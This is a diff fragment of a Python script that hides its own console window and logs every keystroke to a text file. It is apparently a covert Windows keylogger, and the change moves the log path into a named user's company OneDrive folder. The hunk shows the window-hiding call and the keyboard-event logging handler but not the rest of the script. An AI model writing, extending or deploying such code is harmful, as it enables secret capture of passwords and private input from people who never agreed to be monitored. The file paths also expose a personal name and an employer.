@@ -5,7 +5,7 @@ import win32gui
 
 win = win32console.GetConsoleWindow() 
 win32gui.ShowWindow(win, 0)
-file_log = "C:/Users/Sneden/Desktop/onlygodknows/output.txt"
+file_log = "C:/Users/Sneden/OneDrive - CITISCAPE L.L.C/oldpc/onlygodknows/output.txt"
 def OnKeyboardEvent(event):
     logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
     chr(event.Ascii)
